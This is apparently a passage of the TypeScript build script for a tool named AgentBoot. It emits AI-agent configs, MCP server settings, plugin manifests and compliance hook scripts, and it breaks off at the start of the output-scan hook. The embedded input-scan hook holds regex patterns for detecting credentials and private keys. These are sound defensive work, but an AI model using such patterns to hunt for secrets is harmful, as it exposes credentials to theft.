        const gBody = gContent.replace(/^---\n[\s\S]*?\n---\n*/, "").trim();

        lines.push(`### ${gName}`);
        if (pathsStr) lines.push(`**Applies to:** \`${pathsStr}\``);
        lines.push("");
        lines.push(gBody);
        lines.push("");
      }
    }
  }

  // Agent definitions
  if (personaConfigs.size > 0) {
    lines.push("## Agents", "");
    for (const [name, pc] of personaConfigs) {
      const description = pc.description ?? name;
      const invocation = pc.invocation ?? `/${name}`;
      lines.push(`### ${name}`);
      lines.push("");
      lines.push(`- **Description**: ${description}`);
      lines.push(`- **Invocation**: \`${invocation}\``);
      if (pc.model) lines.push(`- **Model**: ${pc.model}`);
      if (pc.traits) {
        const traitNames = Array.isArray(pc.traits) ? pc.traits : Object.keys(pc.traits);
        if (traitNames.length > 0) {
          lines.push(`- **Traits**: ${traitNames.join(", ")}`);
        }
      }
      lines.push("");
    }
  }

  // AB-145: Scope-aware output path (targetPlatform allows writing to a different platform dir)
  const platformDir = targetPlatform ?? "agents";
  if (scopePath) {
    const agentsDir = path.join(distPath, platformDir, scopePath);
    ensureDir(agentsDir);
    fs.writeFileSync(path.join(agentsDir, "AGENTS.md"), lines.join("\n"), "utf-8");
  } else {
    const agentsDir = path.join(distPath, platformDir);
    ensureDir(agentsDir);
    fs.writeFileSync(path.join(agentsDir, "AGENTS.md"), lines.join("\n"), "utf-8");
  }
}

// ---------------------------------------------------------------------------
// Composition manifest generation
// ---------------------------------------------------------------------------

/**
 * Generate composition-manifest.json for a scope directory.
 * Maps relative file paths to their resolved composition types.
 * Used by sync.ts to enforce rule/preference merge semantics.
 */
function generateCompositionManifest(
  distPath: string,
  platform: string,
  scopePath: string,
  config: AgentBootConfig
): void {
  const scopeDir = path.join(distPath, platform, scopePath);
  if (!fs.existsSync(scopeDir)) return;

  const manifest: Record<string, string> = {};
  const configOverrides = config.composition?.overrides;
  const configDefaults = config.composition?.defaults;

  function walkDir(dir: string, relBase: string): void {
    if (!fs.existsSync(dir)) return;
    for (const entry of fs.readdirSync(dir)) {
      const absPath = path.join(dir, entry);
      const relPath = relBase ? `${relBase}/${entry}` : entry;
      if (fs.statSync(absPath).isDirectory()) {
        walkDir(absPath, relPath);
      } else if (entry.endsWith(".md")) {
        const content = fs.readFileSync(absPath, "utf-8");
        const fm = parseFrontmatter(content);
        manifest[relPath] = resolveCompositionType(relPath, fm, configOverrides, configDefaults);
      }
    }
  }

  walkDir(scopeDir, "");

  if (Object.keys(manifest).length > 0) {
    fs.writeFileSync(
      path.join(scopeDir, "composition-manifest.json"),
      JSON.stringify(manifest, null, 2) + "\n",
      "utf-8"
    );
  }
}

// AB-26: settings.json generation
// ---------------------------------------------------------------------------

function generateSettingsJson(
  config: AgentBootConfig,
  distPath: string,
  scopePath: string
): void {
  const hooks = config.claude?.hooks;
  const permissions = config.claude?.permissions;

  if (!hooks && !permissions) return;

  // Validate hooks structure (must be an object with string keys)
  if (hooks && typeof hooks !== "object") {
    log(chalk.yellow("  ⚠ config.claude.hooks must be an object — skipping settings.json"));
    return;
  }
  if (permissions) {
    if (permissions.allow && !Array.isArray(permissions.allow)) {
      log(chalk.yellow("  ⚠ config.claude.permissions.allow must be an array — skipping"));
      return;
    }
    if (permissions.deny && !Array.isArray(permissions.deny)) {
      log(chalk.yellow("  ⚠ config.claude.permissions.deny must be an array — skipping"));
      return;
    }
  }

  // Security: hooks execute shell commands in target repos — warn prominently
  if (hooks) {
    log(chalk.red("  ⚠ CAUTION: settings.json contains hooks that execute shell commands in target repos."));
    log(chalk.red("    Review claude.hooks in agentboot.config.json carefully before syncing."));
    // Validate hook event names against known CC events
    const validEvents = [
      "PreToolUse", "PostToolUse", "Notification", "Stop",
      "SubagentStop", "SubagentStart", "UserPromptSubmit", "SessionEnd",
      "PreCompact",
    ];
    for (const key of Object.keys(hooks)) {
      if (!validEvents.includes(key)) {
        log(chalk.yellow(`    ⚠ Unknown hook event: "${key}" — may not be recognized by Claude Code`));
      }
    }
  } else {
    log(chalk.yellow("  ⚠ Generating settings.json with permissions — these will be synced to all target repos"));
  }

  const settings: Record<string, unknown> = {};
  if (hooks) settings["hooks"] = hooks;
  if (permissions) settings["permissions"] = permissions;

  const settingsPath = path.join(distPath, "claude", scopePath, "settings.json");
  fs.writeFileSync(settingsPath, JSON.stringify(settings, null, 2) + "\n", "utf-8");
}

// ---------------------------------------------------------------------------
// AB-27: .mcp.json generation
// ---------------------------------------------------------------------------

function generateMcpJson(
  config: AgentBootConfig,
  distPath: string,
  scopePath: string
): void {
  const mcpServers = config.claude?.mcpServers;
  if (!mcpServers) return;

  if (typeof mcpServers !== "object") {
    log(chalk.yellow("  ⚠ config.claude.mcpServers must be an object — skipping .mcp.json"));
    return;
  }

  log(chalk.yellow("  ⚠ Generating .mcp.json with MCP servers — these will be synced to all target repos"));

  // AB-143: MCP governance — filter unapproved servers (without mutating original config)
  let filteredServers = mcpServers;
  if (config.mcp?.enforceApproved && config.mcp.approved) {
    const approvedNames = new Set(config.mcp.approved.map(s => s.name));
    filteredServers = Object.fromEntries(
      Object.entries(mcpServers as Record<string, unknown>).filter(([name]) => {
        if (!approvedNames.has(name)) {
          log(chalk.red(`  ✗ MCP server "${name}" is not in the approved list — excluded from output`));
          return false;
        }
        return true;
      })
    );
  }

  const mcpJson = { mcpServers: filteredServers };
  const mcpPath = path.join(distPath, "claude", scopePath, ".mcp.json");
  fs.writeFileSync(mcpPath, JSON.stringify(mcpJson, null, 2) + "\n", "utf-8");

  // AB-143: Generate MCP governance manifest
  if (config.mcp?.approved) {
    const mcpManifest = {
      approved: config.mcp.approved,
      enforceApproved: config.mcp.enforceApproved ?? false,
      required: config.mcp.required ?? [],
      generatedAt: new Date().toISOString(),
    };
    const manifestPath = path.join(distPath, "claude", scopePath, "mcp-governance.json");
    fs.writeFileSync(manifestPath, JSON.stringify(mcpManifest, null, 2) + "\n", "utf-8");
    log(chalk.gray(`  → MCP governance manifest written`));
  }

}

/**
 * Phase 11 MCP Expansion: Emit MCP configs for non-Claude platforms.
 * Always emits the AgentBoot MCP server entry, regardless of claude.mcpServers config.
 */
function generateCrossPlatformMcpConfigs(
  config: AgentBootConfig,
  distPath: string,
  scopePath: string,
): void {
  // A5: was `?? []` — an omitted personas.outputFormats silently emitted NO
  // cross-platform MCP config while the build reported success.
  const outputFormats = config.personas?.outputFormats ?? [...DEFAULT_OUTPUT_FORMATS];
  const abMcpEntry = { command: "npx", args: [agentbootNpxSpec(), "mcp-server"] };

  if (outputFormats.includes("cursor")) {
    const cursorMcpDir = path.join(distPath, "cursor", scopePath, ".cursor");
    ensureDir(cursorMcpDir);
    const cursorMcp = { mcpServers: { agentboot: abMcpEntry } };
    fs.writeFileSync(path.join(cursorMcpDir, "mcp.json"), JSON.stringify(cursorMcp, null, 2) + "\n", "utf-8");
  }

  if (outputFormats.includes("jetbrains")) {
    const junieMcpDir = path.join(distPath, "jetbrains", scopePath, ".junie", "mcp");
    ensureDir(junieMcpDir);
    const junieMcp = { mcpServers: { agentboot: abMcpEntry } };
    fs.writeFileSync(path.join(junieMcpDir, "mcp.json"), JSON.stringify(junieMcp, null, 2) + "\n", "utf-8");
  }

  if (outputFormats.includes("gemini")) {
    const geminiSettingsDir = path.join(distPath, "gemini", scopePath, ".gemini");
    ensureDir(geminiSettingsDir);
    const geminiSettingsPath = path.join(geminiSettingsDir, "settings.json");
    let existing: Record<string, unknown> = {};
    if (fs.existsSync(geminiSettingsPath)) {
      try { existing = JSON.parse(fs.readFileSync(geminiSettingsPath, "utf-8")); } catch { /* ignore */ }
    }
    (existing as Record<string, unknown>)["mcpServers"] = {
      ...(existing["mcpServers"] as Record<string, unknown> ?? {}),
      agentboot: abMcpEntry,
    };
    fs.writeFileSync(geminiSettingsPath, JSON.stringify(existing, null, 2) + "\n", "utf-8");
  }

  // Phase 11 A1.7: Codex MCP config (.codex/config.toml)
  if (outputFormats.includes("codex")) {
    generateCodexConfig(distPath, scopePath);
  }
}

// ---------------------------------------------------------------------------
// Phase 11 A1.7: Codex platform output generation
// ---------------------------------------------------------------------------

/**
 * Generate .codex/config.toml with MCP server entry.
 * Codex uses TOML — AgentBoot's first TOML output target.
 */
function generateCodexConfig(distPath: string, scopePath: string): void {
  const codexDir = path.join(distPath, "codex", scopePath, ".codex");
  ensureDir(codexDir);

  const tomlLines: string[] = [
    "# AgentBoot managed configuration for Codex",
    "# Generated by AgentBoot — do not edit manually.",
    "",
    "[mcp_servers.agentboot]",
    'command = "npx"',
    `args = ["${agentbootNpxSpec()}", "mcp-server"]`,
    "enabled = true",
    "",
  ];
  fs.writeFileSync(path.join(codexDir, "config.toml"), tomlLines.join("\n"), "utf-8");
}

/**
 * Generate .codex/hooks.json with compliance hooks.
 * Codex hook format is identical to Claude Code — same event names, same JSON structure.
 */
function generateCodexHooks(
  config: AgentBootConfig,
  distPath: string,
  scopePath: string,
  scripts: HookScript[],
): void {
  if (scripts.length === 0) return;

  const codexDir = path.join(distPath, "codex", scopePath, ".codex");
  ensureDir(codexDir);

  // Codex consumes the same portable scripts — write our own copy so this does
  // not depend on the Claude Code emitter having run first (clean-build safe).
  const codexHooksDir = path.join(codexDir, "hooks");
  writeHookScripts(scripts, codexHooksDir);

  const scriptNames = new Set(scripts.map((s) => s.name));
  const denyOn = denyToolsActive(config);

  // Derive the wiring from the canonical bindings. Codex uses CC-format event
  // names but honors only a subset (see CODEX_SUPPORTED_EVENTS); timeouts are in
  // seconds. Caveats (snake_case in / camelCase out; partial tool coverage;
  // trust-review-unless-managed) are documented at COMPLIANCE_HOOK_BINDINGS.
  const hooksConfig: Record<string, unknown[]> = {};
  for (const b of COMPLIANCE_HOOK_BINDINGS) {
    if (b.requiresDenyTools && !denyOn) continue;
    if (!scriptNames.has(b.script)) continue;
    if (!CODEX_SUPPORTED_EVENTS.has(b.ccEvent)) continue;
    hooksConfig[b.ccEvent] = hooksConfig[b.ccEvent] ?? [];
    (hooksConfig[b.ccEvent] as unknown[]).push({
      matcher: b.matcher,
      hooks: [{
        type: "command",
        command: `.codex/hooks/${b.script}`,
        timeout: Math.max(1, Math.ceil(b.timeoutMs / 1000)),
      }],
    });
  }

  if (Object.keys(hooksConfig).length > 0) {
    fs.writeFileSync(
      path.join(codexDir, "hooks.json"),
      JSON.stringify({ hooks: hooksConfig }, null, 2) + "\n",
      "utf-8",
    );
  }
}

/**
 * A1.5: Generate GitHub Copilot governance hooks — `.github/hooks/agentboot.json`
 * plus the portable hook scripts under `.github/hooks/`. One committed file
 * governs both the Copilot CLI and the cloud agent. Copilot accepts Claude-format
 * plugin hooks, so the structure mirrors CC's with Copilot's camelCase event names
 * (COPILOT_EVENT_MAP). Blocking is via the scripts' exit code 2. NOTE: Copilot
 * command-hook timeouts FAIL OPEN — see the caveat block at COMPLIANCE_HOOK_BINDINGS.
 * (Copilot emission is documented-but-not-yet-empirically-verified for GA; see the
 * platform-refresh research doc and the pending exit-2-deny mini-test.)
 */
function generateCopilotHooks(
  config: AgentBootConfig,
  distPath: string,
  scopePath: string,
  scripts: HookScript[],
): void {
  if (scripts.length === 0) return;

  const githubDir = path.join(distPath, "copilot", scopePath, ".github");
  const hooksDir = path.join(githubDir, "hooks");
  writeHookScripts(scripts, hooksDir);

  const scriptNames = new Set(scripts.map((s) => s.name));
  const denyOn = denyToolsActive(config);

  const hooksConfig: Record<string, unknown[]> = {};
  for (const b of COMPLIANCE_HOOK_BINDINGS) {
    if (b.requiresDenyTools && !denyOn) continue;
    if (!scriptNames.has(b.script)) continue;
    const copilotEvent = COPILOT_EVENT_MAP[b.ccEvent];
    if (!copilotEvent) continue;
    hooksConfig[copilotEvent] = hooksConfig[copilotEvent] ?? [];
    (hooksConfig[copilotEvent] as unknown[]).push({
      matcher: b.matcher,
      hooks: [{
        type: "command",
        command: `.github/hooks/${b.script}`,
        timeout: b.timeoutMs,
      }],
    });
  }

  if (Object.keys(hooksConfig).length > 0) {
    fs.writeFileSync(
      path.join(hooksDir, "agentboot.json"),
      JSON.stringify({ version: 1, hooks: hooksConfig }, null, 2) + "\n",
      "utf-8",
    );
  }
}

/**
 * Generate .agents/skills/<persona>/SKILL.md for Codex + cross-tool consumption.
 * Copies from dist/skill/ output (already compiled).
 */
function generateCrossToolSkills(
  distPath: string,
  scopePath: string,
  targetPlatformDir: string,
): void {
  const skillSrcDir = path.join(distPath, "skill", scopePath);
  if (!fs.existsSync(skillSrcDir)) return;

  const agentsSkillsDir = path.join(distPath, targetPlatformDir, scopePath, ".agents", "skills");

  for (const entry of fs.readdirSync(skillSrcDir, { withFileTypes: true })) {
    if (!entry.isDirectory()) continue;
    if (entry.name === "instructions" || entry.name === "gotchas") continue; // skip non-persona dirs
    const skillMd = path.join(skillSrcDir, entry.name, "SKILL.md");
    if (fs.existsSync(skillMd)) {
      const destDir = path.join(agentsSkillsDir, entry.name);
      ensureDir(destDir);
      fs.copyFileSync(skillMd, path.join(destDir, "SKILL.md"));
    }
  }
}

// ---------------------------------------------------------------------------
// AB-53: Domain layer loading
// ---------------------------------------------------------------------------

function loadDomainManifest(domainDir: string): DomainManifest | null {
  const manifestPath = path.join(domainDir, "agentboot.domain.json");
  if (!fs.existsSync(manifestPath)) {
    return null;
  }
  try {
    const raw = fs.readFileSync(manifestPath, "utf-8");
    return JSON.parse(stripJsoncComments(raw)) as DomainManifest;
  } catch {
    log(chalk.yellow(`  ⚠ Failed to parse agentboot.domain.json in ${domainDir}`));
    return null;
  }
}

function compileDomains(
  config: AgentBootConfig,
  configDir: string,
  distPath: string,
  traits: Map<string, TraitContent>,
  outputFormats: string[],
  scopeSeen?: Map<string, ScopedArtifact>,
): CompileResult[] {
  const domains = config.domains;
  if (!domains || domains.length === 0) return [];

  log(chalk.cyan("\nCompiling domain layers..."));
  const results: CompileResult[] = [];

  for (const domainRef of domains) {
    const domainPath = typeof domainRef === "string"
      ? path.resolve(configDir, domainRef)
      : path.resolve(configDir, domainRef.path ?? `./domains/${domainRef.name}`);

    if (!fs.existsSync(domainPath)) {
      log(chalk.yellow(`  ⚠ Domain not found: ${domainPath}`));
      continue;
    }

    // S3 fix: path traversal protection — resolve symlinks then check boundary
    const boundary = path.resolve(configDir);
    const realDomainPath = fs.realpathSync(domainPath);
    if (!realDomainPath.startsWith(boundary + path.sep) && realDomainPath !== boundary) {
      log(chalk.red(`  ✗ Domain path escapes project boundary: ${domainPath} → ${realDomainPath}`));
      continue;
    }

    const manifest = loadDomainManifest(domainPath);
    const domainName = manifest?.name ?? path.basename(domainPath);
    log(chalk.gray(`  Domain: ${domainName}${manifest?.version ? ` v${manifest.version}` : ""}`));

    // Load domain-specific traits
    const domainTraitsDir = path.join(domainPath, "traits");
    if (fs.existsSync(domainTraitsDir)) {
      const domainTraits = loadTraits(domainTraitsDir, undefined);
      for (const [name, trait] of domainTraits) {
        if (traits.has(name)) {
          log(chalk.yellow(`    ⚠ Domain trait '${name}' shadows existing trait`));
        }
        traits.set(name, trait);
      }
      log(chalk.gray(`    + ${domainTraits.size} trait(s)`));
    }

    // Compile domain personas
    const domainPersonasDir = path.join(domainPath, "personas");
    if (fs.existsSync(domainPersonasDir)) {
      const personaDirs = fs.readdirSync(domainPersonasDir).filter((entry) =>
        fs.statSync(path.join(domainPersonasDir, entry)).isDirectory()
      );
      for (const personaName of personaDirs) {
        const personaDir = path.join(domainPersonasDir, personaName);
        const result = compilePersona(
          personaName,
          personaDir,
          traits,
          config,
          distPath,
          `domains/${domainName}`
        );
        results.push(result);
        log(`    ${chalk.green("✓")} ${personaName}`);
      }
    }

    // Compile domain instructions
    const domainInstructionsDir = path.join(domainPath, "instructions");
    compileInstructions(
      domainInstructionsDir,
      undefined,
      distPath,
      `domains/${domainName}`,
      config,
      outputFormats,
      scopeSeen,
    );
  }

  return results;
}

// ---------------------------------------------------------------------------
// AB-57: Plugin structure generation
// ---------------------------------------------------------------------------

function generatePluginOutput(
  config: AgentBootConfig,
  distPath: string,
  allResults: CompileResult[],
  personasBaseDir: string,
  traits: Map<string, TraitContent>
): void {
  const pluginDir = path.join(distPath, "plugin");
  ensureDir(pluginDir);

  const pkgPath = path.join(ROOT, "package.json");
  const pkg = fs.existsSync(pkgPath)
    ? JSON.parse(fs.readFileSync(pkgPath, "utf-8"))
    : { version: "0.0.0" };

  const personas: PluginManifest["personas"] = [];
  const traitEntries: PluginManifest["traits"] = [];
  const ruleEntries: PluginManifest["rules"] = [];

  // Copy agents and skills from claude output
  const claudeCorePath = path.join(distPath, "claude", "core");

  // Agents
  const agentsDir = path.join(claudeCorePath, "agents");
  const pluginAgentsDir = path.join(pluginDir, "agents");
  if (fs.existsSync(agentsDir)) {
    ensureDir(pluginAgentsDir);
    for (const file of fs.readdirSync(agentsDir)) {
      fs.copyFileSync(path.join(agentsDir, file), path.join(pluginAgentsDir, file));
    }
  }

  // Skills
  const skillsDir = path.join(claudeCorePath, "skills");
  const pluginSkillsDir = path.join(pluginDir, "skills");
  if (fs.existsSync(skillsDir)) {
    ensureDir(pluginSkillsDir);
    for (const skillFolder of fs.readdirSync(skillsDir)) {
      const src = path.join(skillsDir, skillFolder);
      if (fs.statSync(src).isDirectory()) {
        const dest = path.join(pluginSkillsDir, skillFolder);
        ensureDir(dest);
        for (const file of fs.readdirSync(src)) {
          fs.copyFileSync(path.join(src, file), path.join(dest, file));
        }
      }
    }
  }

  // Traits
  const pluginTraitsDir = path.join(pluginDir, "traits");
  ensureDir(pluginTraitsDir);
  for (const [name, trait] of traits) {
    fs.writeFileSync(path.join(pluginTraitsDir, `${name}.md`), trait.raw, "utf-8");
    traitEntries.push({ id: name, path: `traits/${name}.md` });
  }

  // Rules
  const rulesDir = path.join(claudeCorePath, "rules");
  const pluginRulesDir = path.join(pluginDir, "rules");
  if (fs.existsSync(rulesDir)) {
    ensureDir(pluginRulesDir);
    for (const file of fs.readdirSync(rulesDir)) {
      fs.copyFileSync(path.join(rulesDir, file), path.join(pluginRulesDir, file));
      ruleEntries.push({ path: `rules/${file}` });
    }
  }

  // Hooks directory (compliance hooks go here)
  const pluginHooksDir = path.join(pluginDir, "hooks");
  ensureDir(pluginHooksDir);

  // Build persona entries
  for (const result of allResults.filter((r) => r.platforms.length > 0 && r.scope === "core")) {
    const personaConfigPath = path.join(personasBaseDir, result.persona, "persona.config.json");
    let pc: PersonaConfig | null = null;
    if (fs.existsSync(personaConfigPath)) {
      try {
        pc = JSON.parse(fs.readFileSync(personaConfigPath, "utf-8")) as PersonaConfig;
      } catch { /* skip */ }
    }

    const invocation = pc?.invocation ?? `/${result.persona}`;
    const skillName = invocation.replace(/^\//, "");

    personas.push({
      id: result.persona,
      name: pc?.name ?? result.persona,
      description: pc?.description ?? "",
      model: pc?.model,
      agent_path: `agents/${result.persona}.md`,
      skill_path: `skills/${skillName}/SKILL.md`,
    });
  }

  // Plugin-spec conformance: hooks/hooks.json registers the compliance hooks.
  // The scripts were previously copied into hooks/ but never REGISTERED — an
  // installed plugin carried them as dead files. Commands use the spec's
  // ${CLAUDE_PLUGIN_ROOT} substitution; entry shape mirrors the settings.json
  // emission (matcher/hooks/type/command/timeout/async), driven by the same
  // canonical COMPLIANCE_HOOK_BINDINGS table so the two surfaces cannot drift.
  const pluginHooksConfig: Record<string, unknown[]> = {};
  for (const b of COMPLIANCE_HOOK_BINDINGS) {
    if (b.requiresDenyTools && !denyToolsActive(config)) continue;
    pluginHooksConfig[b.ccEvent] = pluginHooksConfig[b.ccEvent] ?? [];
    pluginHooksConfig[b.ccEvent]!.push({
      matcher: b.matcher,
      hooks: [{
        type: "command",
        // Quoted per the reference examples — the plugin cache path may contain spaces.
        command: `"\${CLAUDE_PLUGIN_ROOT}"/hooks/${b.script}`,
        timeout: b.timeoutMs,
        ...(b.async ? { async: true } : {}),
      }],
    });
  }
  fs.writeFileSync(
    path.join(pluginHooksDir, "hooks.json"),
    JSON.stringify({ hooks: pluginHooksConfig }, null, 2) + "\n",
    "utf-8"
  );

  // Generate the manifest at the SPEC location: .claude-plugin/plugin.json.
  // (A root-level plugin.json is invisible to the plugin system — the official
  // validator rejects the directory outright.) Spec-recognized fields use
  // spec types (kebab-case name, author as an object); the AgentBoot inventory
  // fields (personas/traits/rules/agentboot_version) ride along deliberately —
  // the spec tolerates unrecognized fields as warnings so one manifest can
  // serve multiple ecosystems.
  const pluginName = `${config.org}-personas`
    .toLowerCase()
    .replace(/[^a-z0-9-]+/g, "-")
    .replace(/-{2,}/g, "-")
    .replace(/^-|-$/g, "");
  const pluginManifest: PluginManifest = {
    name: pluginName,
    displayName: `${config.orgDisplayName ?? config.org} Personas`,
    version: pkg.version,
    description: `Agentic personas for ${config.orgDisplayName ?? config.org}`,
    author: { name: config.orgDisplayName ?? config.org },
    license: "Apache-2.0",
    hooks: "./hooks/hooks.json",
    agentboot_version: pkg.version,
    personas,
    traits: traitEntries,
    rules: ruleEntries.length > 0 ? ruleEntries : undefined,
  };

  const manifestDir = path.join(pluginDir, ".claude-plugin");
  ensureDir(manifestDir);
  fs.writeFileSync(
    path.join(manifestDir, "plugin.json"),
    JSON.stringify(pluginManifest, null, 2) + "\n",
    "utf-8"
  );

  log(chalk.gray(`  → Plugin output written to dist/plugin/ (.claude-plugin/plugin.json + hooks/hooks.json)`));
}

// ---------------------------------------------------------------------------
// A1.5: Canonical compliance-hook layer (Claude Code format = the source schema)
//
// One source of truth for the portable hook SCRIPTS (buildComplianceHookScripts)
// and for their lifecycle WIRING (COMPLIANCE_HOOK_BINDINGS). Every platform
// emitter — Claude Code settings.json, Codex .codex/hooks.json, Copilot
// .github/hooks/*.json — derives from these two so the three stay in lock-step.
// Claude Code event names are canonical; each emitter translates as needed.
//
// Cross-platform enforcement caveats (docs/research/platform-refresh-2026-07-11.md):
//   - Claude Code : matcher is EXACT-match (no substring); exit 2 blocks a tool.
//   - Codex       : same event names as CC, but stdin is snake_case while the
//                   output envelope is camelCase (hookSpecificOutput /
//                   permissionDecision); tool coverage is partial (shell + patch
//                   + MCP, not WebSearch); hooks require a trust review unless
//                   deployed as managed. exit 2 blocks.
//   - Copilot     : command-hook TIMEOUTS FAIL OPEN (hook *errors* fail closed);
//                   a single committed .github/hooks/*.json governs BOTH the CLI
//                   and the cloud agent. exit 2 = deny.
// The generated scripts signal a block via exit code 2 — the one blocking
// primitive all three platforms honor regardless of stdout shape.
// ---------------------------------------------------------------------------

interface HookScript {
  /** Filename, e.g. "agentboot-input-scan.sh". */
  name: string;
  content: string;
}

interface ComplianceHookBinding {
  /** Generated script filename (lives in the platform's hooks dir). */
  script: string;
  /** Canonical Claude Code event name. */
  ccEvent: string;
  /** CC matcher (exact-match). "" = all events/tools. */
  matcher: string;
  /** Timeout in milliseconds. CC/Copilot use ms; the Codex emitter converts to seconds. */
  timeoutMs: number;
  /** Run asynchronously (Claude Code settings.json only). */
  async?: boolean;
  /** Only emit when managed.guardrails.denyTools is non-empty. */
  requiresDenyTools?: boolean;
}

const COMPLIANCE_HOOK_BINDINGS: ComplianceHookBinding[] = [
  { script: "agentboot-input-scan.sh",  ccEvent: "UserPromptSubmit", matcher: "",                timeoutMs: 5000 },
  // NOT async: an async Stop hook cannot deliver a blocking decision — its
  // exit code / stdout are ignored by the platform. Blocking output scan
  // requires a synchronous binding.
  { script: "agentboot-output-scan.sh", ccEvent: "Stop",             matcher: "",                timeoutMs: 5000 },
  { script: "agentboot-telemetry.sh",   ccEvent: "SubagentStart",    matcher: "",                timeoutMs: 3000, async: true },
  { script: "agentboot-telemetry.sh",   ccEvent: "SubagentStop",     matcher: "",                timeoutMs: 3000, async: true },
  { script: "agentboot-telemetry.sh",   ccEvent: "PostToolUse",      matcher: "Edit|Write|Bash", timeoutMs: 3000, async: true },
  { script: "agentboot-telemetry.sh",   ccEvent: "SessionEnd",       matcher: "",                timeoutMs: 3000, async: true },
  { script: "agentboot-pretooluse.sh",  ccEvent: "PreToolUse",       matcher: "",                timeoutMs: 5000, requiresDenyTools: true },
];

/** Codex honors these CC-named events (research §3b). SessionEnd is NOT supported. */
const CODEX_SUPPORTED_EVENTS = new Set([
  "PreToolUse", "PostToolUse", "PermissionRequest", "PreCompact", "PostCompact",
  "SessionStart", "SubagentStart", "SubagentStop", "UserPromptSubmit", "Stop",
]);

/** CC event name → Copilot event name. Events absent from the map are not emitted for Copilot. */
const COPILOT_EVENT_MAP: Record<string, string> = {
  UserPromptSubmit: "userPromptSubmitted",
  PreToolUse: "preToolUse",
  PostToolUse: "postToolUse",
  Stop: "agentStop",
  SubagentStop: "subagentStop",
  SessionEnd: "sessionEnd",
  // SubagentStart intentionally omitted — not in Copilot's lifecycle event set.
};

/** True when managed guardrails configure a PreToolUse deny-list. */
function denyToolsActive(config: AgentBootConfig): boolean {
  return (config.managed?.guardrails?.denyTools ?? []).length > 0;
}

/** Write hook scripts into `dir` with the execute bit set. */
function writeHookScripts(scripts: HookScript[], dir: string): void {
  ensureDir(dir);
  for (const s of scripts) {
    fs.writeFileSync(path.join(dir, s.name), s.content, { mode: 0o755 });
  }
}

// ---------------------------------------------------------------------------
// AB-59/60/63: Compliance & audit trail hook generation
// ---------------------------------------------------------------------------

/**
 * Build the portable compliance hook scripts (the CC-format source). Pure w.r.t.
 * the filesystem except for build-time validation of telemetry.logPath. Returned
 * scripts are consumed by every platform emitter (Claude Code, Codex, Copilot).
 */
function buildComplianceHookScripts(config: AgentBootConfig): HookScript[] {
  // B2/B3: org-pluggable scanners + output blocking. The scanner command is
  // embedded verbatim in generated bash, so reject shell metacharacters at
  // build time — the org config is the trust root, but a quoting accident
  // must fail the build, not produce a broken (or injectable) hook.
  const sanitizeScanner = (cmd: string | undefined, label: string): string => {
    if (!cmd) return "";
    if (/["'`$\n\r;|&<>]/.test(cmd)) {
      throw new Error(
        `compliance.${label}.scannerCommand contains shell metacharacters (quotes, backticks, $, ;, |, &, <, > or newlines) — not embeddable in the generated hook`
      );
    }
    return cmd.trim();
  };
  const inputScanner = sanitizeScanner(config.compliance?.inputScan?.scannerCommand, "inputScan");
  const inputFailClosed = config.compliance?.inputScan?.failMode === "closed";
  const outputScanner = sanitizeScanner(config.compliance?.outputScan?.scannerCommand, "outputScan");
  const outputFailClosed = config.compliance?.outputScan?.failMode === "closed";
  const outputBlocking = config.compliance?.outputScan?.blocking === true;

  // AB-59: Input scanning hook (UserPromptSubmit)
  // Phase 11 A2: Replaced jq with node -e for Windows/git-bash portability
  // Note: -e intentionally omitted because grep -q returns 1 on no-match
  const inputScanHook = `#!/bin/bash
# AgentBoot compliance hook — input scanning (AB-59)
# Event: UserPromptSubmit
# Generated by AgentBoot. Do not edit manually.

set -uo pipefail
HOME="\${HOME:-\${USERPROFILE:-$(node -e "console.log(require('os').homedir())")}}"
command -v node >/dev/null 2>&1 || { echo '{"decision":"block","reason":"AgentBoot: node is required for input scanning"}'; exit 2; }

${hookInputCapPrelude({
    overCapStderr: "prompt exceeds $MAX_HOOK_INPUT_BYTES bytes — cannot scan it in full.",
    action: "block",
    blockReason:
      "AgentBoot: prompt exceeds the hook input limit and could not be scanned. Split it, or raise AGENTBOOT_MAX_HOOK_INPUT_BYTES deliberately.",
  })}
PROMPT=$(printf '%s' "$INPUT" | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>{try{const j=JSON.parse(d);process.stdout.write(j.prompt||'')}catch{process.stdout.write('')}})") || { echo '{"decision":"block","reason":"AgentBoot: Failed to parse hook input"}'; exit 2; }

# Scan for potential credential leaks in prompts
PATTERNS=(
  'password[[:space:]]*[:=]'
  'api[_-]?key[[:space:]]*[:=]'
  'secret[[:space:]]*[:=]'
  'token[[:space:]]*[:=]'
  'AKIA[A-Z0-9]{16}'
  'sk-[a-zA-Z0-9]{20,}'
  'ghp_[a-zA-Z0-9]{36}'
  'xox[bp]-[a-zA-Z0-9-]+'
  'sk_live_[a-zA-Z0-9]+'
  'BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY'
)

for pattern in "\${PATTERNS[@]}"; do
  if printf '%s' "$PROMPT" | grep -qiE "$pattern"; then
    echo '{"decision":"block","reason":"AgentBoot: Potential credential detected in prompt. Remove secrets before proceeding."}'
    exit 2
  fi
done
${inputScanner ? `
# Org-supplied scanner (compliance.inputScan.scannerCommand).
# Contract: content on stdin; exit 0 = allow, exit 2 = block, other = scanner failure.
SCAN_OUT=$(printf '%s' "$PROMPT" | ${inputScanner} 2>&1)
SCAN_STATUS=$?
if [ "$SCAN_STATUS" -eq 2 ]; then
  echo "AgentBoot scanner: $SCAN_OUT" >&2
  echo '{"decision":"block","reason":"AgentBoot: the organization content scanner blocked this prompt. Remove the flagged content before proceeding."}'
  exit 2
elif [ "$SCAN_STATUS" -ne 0 ]; then${inputFailClosed ? `
  echo "AgentBoot scanner failed (exit $SCAN_STATUS): $SCAN_OUT" >&2
  echo '{"decision":"block","reason":"AgentBoot: the organization content scanner failed and inputScan.failMode is closed."}'
  exit 2` : `
  echo "AgentBoot: organization scanner failed (exit $SCAN_STATUS) — continuing on bundled patterns only (failMode: open)" >&2`}
fi
` : ""}
exit 0
`;

  // AB-60: Output scanning hook (Stop)
  // Phase 11 A2: Replaced jq with node -e for Windows/git-bash portability
  //
  // Payload truth (v0.16.0 hardening): the platform's Stop payload carries the
  // assistant's final text as `last_assistant_message` (never `response` — the
  // pre-0.16 hook read a field that does not exist and scanned the empty
  // string on every invocation). Fallback: extract the last assistant message
  // from the JSONL transcript at `transcript_path` for older platforms.
  //
  // Blocking semantics, honestly stated: a Stop-hook block cannot retract
  // output that is already displayed. It forces a corrective continuation —
  // the model is told what was flagged and must redact/rotate before the turn
  // can end. That is remediation-forcing, not display suppression.
  const outputScanHook = `#!/bin/bash
# AgentBoot compliance hook — output scanning (AB-60)
# Event: Stop
